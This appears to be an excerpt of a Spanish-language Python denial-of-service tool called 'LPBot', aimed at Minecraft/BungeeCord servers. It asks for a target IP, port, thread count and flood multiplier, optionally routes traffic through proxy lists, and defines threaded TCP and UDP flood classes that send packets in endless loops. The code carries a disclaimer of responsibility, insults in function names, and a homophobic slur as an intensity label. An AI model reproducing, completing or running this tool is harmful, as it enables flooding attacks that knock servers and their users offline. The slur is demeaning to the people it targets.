...
print("")
print("")
print (" - HEY! " + Fore.GREEN + Style.BRIGHT + "- BungeeCord es necesario!")
print("")
print("")
...
try:
	...
	print ("    " + Fore.WHITE + Back.RED + "Paquetes UDP/TCP no son compatibles con tu sistema operativo \n Utiliza paquetes HTTP UNICAMENTE!.")
...
def funcion01():
	...
	ip = input(Style.RESET_ALL + "\n[LPBot] IP numerica: ").strip()
	ipport = input(Style.RESET_ALL + "\n[LPBot] Puerto: ")
	ip = "http://" + ip + ":" + ipport

	if ip == "":
		print ("[LPBot] - Introduce la IP numerica.")
		funcion01()
	if ipport == "":
		print ("[LPBot] - Introduce el puerto! (1-65535)")
		funcion01()
	try:
		ip2 = ip.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
	except:
		ip2 = ip.replace("http://", "").replace("https://", "").split("/")[0]

	try:
		ipport = ip.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
	except:
		ipport = "25565"
...
def floodmode():
	global Opt1
	print("")
	Opt1 = input(Fore.GREEN + Style.BRIGHT + "[LPBot] Paquetes - \n-> HTTP '0' (Recomendado) \n-> TCP '1' #Proximamente \n-> UDP '2' #Proximamente \n\n[LPBot] Escoge - " + Style.RESET_ALL)
	if Opt1 == "0":
	    Opt1 = "0"
	    proxymode()
	elif Opt1 == "1":
		try:
			if os.getuid() != 0:
				print("[LPBot] - Necesitas ROOT!")
				exit(0)
			else:
			    Opt1 = "0"
			    print(" - Proximamente - (Escogiendo HTTP en vez)")
			    proxymode()
		except:
			Opt1 == "0"
	elif Opt1 == "2":
		try:
			if os.getuid() != 0:
				print("[LPBot] - Necesitas ejecutar este script como root para utilizar los paquetes UDP / TCP.")
				exit(0)
			else:
			    Opt1 = "0"
			    print(" - Proximamente - (Escogiendo HTTP en vez)")
	    ...
	    Opt1 = "0"
	    print ("[LPBot] Opciones: 0 (Por ahora)")
	    proxymode()
...
def floodport():
	global port
	try:
		port = int(input("[LPBot] - Introduce el puerto! (1-65535): "))
		portlist = range(65535)
		if port in portlist:
			pass
		else:
			print ("[LPBot] ERROR! Introduce el puerto! (1-65535): ")
			floodport()
	except ValueError:
		print ("[LPBot] ERROR! Introduce el puerto! (1-65535): ")
		floodport()
...
def proxymode():
	global Opt2
	Opt2 = input("[LPBot] - Quieres utilizar proxies? Y - N: ")
	if Opt2 == 'S' or Opt2 == 'SI' or Opt2 == 'si' or Opt2 == 'y' or Opt2 == 'Y':
		chProxies2()
	else:
		gabrielesputo()
...
def proxylist():
	global proxies
	out_file = str(input("[LPBot] Directorio para las proxies? (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def gabrielesputo():
	global threads
	try:
		threads = int(input("[LPBot] Threads (1000)?: "))
	except ValueError:
		threads = 1000
		print ("[LPBot] - 1000 THREADS!...\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("[LPBOt] - Escoge el enforzamiento - \n1 / 5 -> Basico\n50 -> Normal\n100 / + = Destroza Maricas\n[LPBot] Escoge: "))
	except ValueError:
		print("[LPBot] - Opciones: 1 - 9999999999+.\n")
		multiplication()
	begin()

def begin():
    print("")
    Opt06 = input("[LPBot] No me hago responsable de tus actos\n- Estas seguro que deseas continuar?: (Presione ENTER)")
    if Opt06 == "":
        loop()
    elif Opt06 == "Enter":
	    loop()
...
def loop():
	...
	if Opt2 == "1":
		if Opt2 == 'S' or Opt2 == 'SI' or Opt2 == 'si' or Opt2 == 'y' or Opt2 == 'Y':
			if Opt03 == "0":
				for x in range(threads):
					...
					print ("Conexion #  " + str(x) + " Empezando!")
				go.set()
			else:
				for x in range(threads):
		...
		if Opt1 == "2":
			if Opt1 == 'S' or Opt1 == 'SI' or Opt1 == 'si' or Opt1 == 'y' or Opt1 == 'Y':
				if Opt03 == "0":
					for x in range(threads):
...
class TcpFloodProxed(threading.Thread):
	...
	def run(self):
		...
		p = bytes(IP(dst=str(ip2))/TCP(sport=RandShort(), dport=int(port))/data)
		current = x
		...
		while True:
			try:
				...
				s = socks.socksocket()
				s.connect((str(ip2),int(port)))
				s.send(p)
				print ("[LPBot] Pinging from " + str(proxy[0]+":"+proxy[1]) + " # ", self.counter)
				try:
		...
		while True:
			try:
				...
				try:
					...
					print ("Sock muerto #  " + str(x) + " Intentando Nuevamente!")
					s.close()

class TcpFloodDefault(threading.Thread):
	...
	def run(self):
		...
		while True:
			try:
				...
				s.connect((str(ip2),int(port)))
				s.send(p)
				print ("Paquete mandado #  " + str(x) + " #RIP!")
				try:
					for y in range(multiple):
						s.send(str.encode(p))
				except:
...
class UdpFloodProxed(threading.Thread):
	...
	def run(self):
		data = random._urandom(1024)
		p = bytes(IP(dst=str(ip2))/UDP(dport=int(port))/data)
		current = x
		if current < len(proxies):
			proxy = proxies[current].strip().split(':')
		else:
...
class UdpFloodDefault(threading.Thread):
